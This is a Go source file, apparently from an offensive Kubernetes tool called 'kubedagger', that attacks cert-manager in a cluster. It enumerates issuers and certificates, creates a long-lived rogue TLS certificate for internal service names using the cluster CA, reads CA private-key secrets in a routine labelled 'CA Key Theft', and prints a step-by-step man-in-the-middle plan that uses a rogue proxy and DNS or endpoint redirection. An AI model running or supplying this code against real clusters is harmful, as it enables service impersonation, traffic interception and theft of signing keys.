package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var certManagerIssuerGVR = schema.GroupVersionResource{
	Group: "cert-manager.io", Version: "v1", Resource: "issuers",
}

var certManagerClusterIssuerGVR = schema.GroupVersionResource{
	Group: "cert-manager.io", Version: "v1", Resource: "clusterissuers",
}

var certManagerCertificateGVR = schema.GroupVersionResource{
	Group: "cert-manager.io", Version: "v1", Resource: "certificates",
}

func detectCertManager(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"cert-manager", "kube-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app.kubernetes.io/name=cert-manager",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "cert-manager",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d cert-manager pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=cert-manager",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "cert-manager",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d cert-manager pods", len(pods.Items)),
			}}
		}
	}

	return nil
}

// ExploitCertManager executes the specified cert-manager exploitation technique.
func ExploitCertManager(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return certManagerEnumerate(ctx, dynClient)
	case "issue_cert":
		return certManagerIssueCert(ctx, dynClient)
	case "steal_ca":
		return certManagerStealCA(ctx, client, dynClient)
	case "mitm_prep":
		return certManagerMITMPrep(ctx, client, dynClient)
	default:
		return certManagerEnumerate(ctx, dynClient)
	}
}

func certManagerEnumerate(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cert-manager Enumeration:\n\n")

	clusterIssuers, err := dynClient.Resource(certManagerClusterIssuerGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list ClusterIssuers: %v\n", err)
		sb.WriteString("  cert-manager CRDs may not be installed\n")
		return &EvasionResult{Technique: "enumerate", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  ClusterIssuers (%d):\n", len(clusterIssuers.Items))
	for _, issuer := range clusterIssuers.Items {
		name := issuer.GetName()
		fmt.Fprintf(&sb, "    - %s\n", name)

		spec, ok := issuer.Object["spec"].(map[string]any)
		if !ok {
			continue
		}

		if ca, ok := spec["ca"].(map[string]any); ok {
			fmt.Fprintf(&sb, "      Type: CA (secret=%v)\n", ca["secretName"])
		}
		if _, ok := spec["acme"].(map[string]any); ok {
			sb.WriteString("      Type: ACME (Let's Encrypt)\n")
		}
		if selfSigned, ok := spec["selfSigned"].(map[string]any); ok {
			_ = selfSigned
			sb.WriteString("      Type: SelfSigned\n")
		}
		if vault, ok := spec["vault"].(map[string]any); ok {
			fmt.Fprintf(&sb, "      Type: Vault (server=%v)\n", vault["server"])
		}
	}

	issuers, err := dynClient.Resource(certManagerIssuerGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		fmt.Fprintf(&sb, "\n  Namespace Issuers (%d):\n", len(issuers.Items))
		for _, issuer := range issuers.Items {
			fmt.Fprintf(&sb, "    - %s/%s\n", issuer.GetNamespace(), issuer.GetName())
		}
	}

	certs, err := dynClient.Resource(certManagerCertificateGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		fmt.Fprintf(&sb, "\n  Certificates (%d):\n", len(certs.Items))
		for _, cert := range certs.Items {
			name := cert.GetName()
			ns := cert.GetNamespace()
			spec, ok := cert.Object["spec"].(map[string]any)
			if !ok {
				fmt.Fprintf(&sb, "    - %s/%s\n", ns, name)
				continue
			}
			secretName, _ := spec["secretName"].(string)
			issuerRef, _ := spec["issuerRef"].(map[string]any)
			issuerName := ""
			if issuerRef != nil {
				issuerName, _ = issuerRef["name"].(string)
			}
			dnsNames, _ := spec["dnsNames"].([]any)
			fmt.Fprintf(&sb, "    - %s/%s (secret=%s issuer=%s dns=%v)\n", ns, name, secretName, issuerName, dnsNames)
		}
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func certManagerIssueCert(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cert-manager Certificate Issuance:\n\n")

	sb.WriteString("  Requesting a certificate for an arbitrary domain using existing issuers.\n")
	sb.WriteString("  If a CA issuer exists with access to a root/intermediate CA,\n")
	sb.WriteString("  we can issue valid certificates for any domain name.\n\n")

	clusterIssuers, err := dynClient.Resource(certManagerClusterIssuerGVR).List(ctx, metav1.ListOptions{})
	if err != nil || len(clusterIssuers.Items) == 0 {
		sb.WriteString("  No ClusterIssuers available for cert issuance\n")
		return &EvasionResult{Technique: "issue_cert", Success: false, Output: sb.String()}, nil
	}

	var targetIssuer string
	for _, issuer := range clusterIssuers.Items {
		spec, ok := issuer.Object["spec"].(map[string]any)
		if !ok {
			continue
		}
		if _, ok := spec["ca"].(map[string]any); ok {
			targetIssuer = issuer.GetName()
			break
		}
		if _, ok := spec["selfSigned"].(map[string]any); ok {
			targetIssuer = issuer.GetName()
			break
		}
	}

	if targetIssuer == "" {
		targetIssuer = clusterIssuers.Items[0].GetName()
		sb.WriteString("  No CA/SelfSigned issuer found, using first available\n")
	}

	cert := &unstructured.Unstructured{
		Object: map[string]any{
			"apiVersion": "cert-manager.io/v1",
			"kind":       "Certificate",
			"metadata": map[string]any{
				"name":      "kubedagger-cert",
				"namespace": "default",
			},
			"spec": map[string]any{
				"secretName": "kubedagger-tls",
				"issuerRef": map[string]any{
					"name": targetIssuer,
					"kind": "ClusterIssuer",
				},
				"dnsNames": []any{
					"*.internal.cluster.local",
					"kubernetes.default.svc",
				},
				"duration":    "8760h",
				"renewBefore": "720h",
			},
		},
	}

	_, err = dynClient.Resource(certManagerCertificateGVR).Namespace("default").Create(ctx, cert, metav1.CreateOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Certificate request failed: %v\n", err)
		sb.WriteString("  May need to adjust the certificate spec or target a namespace issuer\n")
	} else {
		fmt.Fprintf(&sb, "  [+] Certificate 'kubedagger-cert' created using issuer '%s'\n", targetIssuer)
		sb.WriteString("  [+] cert-manager will store the signed cert in secret 'kubedagger-tls'\n")
		sb.WriteString("  [+] DNS names: *.internal.cluster.local, kubernetes.default.svc\n")
	}

	sb.WriteString("\n  Impact:\n")
	sb.WriteString("    - Valid TLS certificate signed by cluster's CA\n")
	sb.WriteString("    - Can impersonate any service with matching DNS name\n")
	sb.WriteString("    - If CA is trusted by mesh, enables transparent MITM\n")

	return &EvasionResult{
		Technique: "issue_cert",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func certManagerStealCA(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cert-manager CA Key Theft:\n\n")

	clusterIssuers, err := dynClient.Resource(certManagerClusterIssuerGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list ClusterIssuers: %v\n", err)
		return &EvasionResult{Technique: "steal_ca", Success: false, Output: sb.String()}, nil
	}

	stolen := false
	for _, issuer := range clusterIssuers.Items {
		spec, ok := issuer.Object["spec"].(map[string]any)
		if !ok {
			continue
		}
		ca, ok := spec["ca"].(map[string]any)
		if !ok {
			continue
		}
		secretName, ok := ca["secretName"].(string)
		if !ok {
			continue
		}

		fmt.Fprintf(&sb, "  CA Issuer: %s (secret=%s)\n", issuer.GetName(), secretName)

		namespaces := []string{"cert-manager", "kube-system", "default"}
		for _, ns := range namespaces {
			secret, err := client.CoreV1().Secrets(ns).Get(ctx, secretName, metav1.GetOptions{})
			if err != nil {
				continue
			}

			fmt.Fprintf(&sb, "  [+] Found CA secret in %s/%s\n", ns, secretName)
			for key, val := range secret.Data {
				fmt.Fprintf(&sb, "    %s: %d bytes\n", key, len(val))
				if strings.Contains(key, "key") || strings.HasSuffix(key, ".key") {
					sb.WriteString("      [PRIVATE KEY EXTRACTED]\n")
					stolen = true
				}
				if strings.Contains(key, "cert") || strings.HasSuffix(key, ".crt") || strings.HasSuffix(key, ".pem") {
					sb.WriteString("      [CERTIFICATE EXTRACTED]\n")
				}
			}
			break
		}
	}

	if !stolen {
		sb.WriteString("\n  Could not extract CA private key\n")
		sb.WriteString("  Possible reasons:\n")
		sb.WriteString("    - Secret is in a different namespace\n")
		sb.WriteString("    - RBAC prevents reading the secret\n")
		sb.WriteString("    - CA is external (Vault, ACME) — no local key\n")
	}

	sb.WriteString("\n  Impact of CA key theft:\n")
	sb.WriteString("    - Issue certificates for ANY domain trusted by the cluster\n")
	sb.WriteString("    - Impersonate any service in the mesh\n")
	sb.WriteString("    - Persistent access even after pod termination\n")
	sb.WriteString("    - Sign long-lived certs for offline access\n")

	return &EvasionResult{
		Technique: "steal_ca",
		Success:   stolen,
		Output:    sb.String(),
	}, nil
}

func certManagerMITMPrep(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("cert-manager MITM Preparation:\n\n")

	sb.WriteString("  Using cert-manager to prepare for man-in-the-middle attacks.\n")
	sb.WriteString("  Strategy: issue certs for target services, intercept their traffic.\n\n")

	certs, err := dynClient.Resource(certManagerCertificateGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list certificates: %v\n", err)
		return &EvasionResult{Technique: "mitm_prep", Success: false, Output: sb.String()}, nil
	}

	sb.WriteString("  Current certificate landscape:\n")
	targets := make(map[string][]string)
	for _, cert := range certs.Items {
		spec, ok := cert.Object["spec"].(map[string]any)
		if !ok {
			continue
		}
		dnsNames, ok := spec["dnsNames"].([]any)
		if !ok {
			continue
		}
		secretName, _ := spec["secretName"].(string)
		for _, dns := range dnsNames {
			if dnsStr, ok := dns.(string); ok {
				targets[dnsStr] = append(targets[dnsStr], secretName)
				fmt.Fprintf(&sb, "    %s → secret:%s\n", dnsStr, secretName)
			}
		}
	}

	sb.WriteString("\n  MITM attack plan:\n")
	sb.WriteString("    1. Identify high-value services (databases, auth, API gateways)\n")
	sb.WriteString("    2. Issue certificate with matching DNS names via cluster issuer\n")
	sb.WriteString("    3. Deploy rogue proxy with the issued certificate\n")
	sb.WriteString("    4. Redirect traffic to rogue proxy via:\n")
	sb.WriteString("       - DNS record manipulation (CoreDNS ConfigMap)\n")
	sb.WriteString("       - Service endpoint modification\n")
	sb.WriteString("       - EnvoyFilter/VirtualService traffic redirect\n")
	sb.WriteString("    5. Proxy decrypts, inspects, re-encrypts, forwards to real service\n\n")

	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{
		FieldSelector: "type=kubernetes.io/tls",
		Limit:         20,
	})
	if err == nil {
		fmt.Fprintf(&sb, "  TLS secrets available (%d found):\n", len(secrets.Items))
		for _, s := range secrets.Items {
			fmt.Fprintf(&sb, "    %s/%s\n", s.Namespace, s.Name)
		}
	}

	return &EvasionResult{
		Technique: "mitm_prep",
		Success:   len(targets) > 0,
		Output:    sb.String(),
	}, nil
}
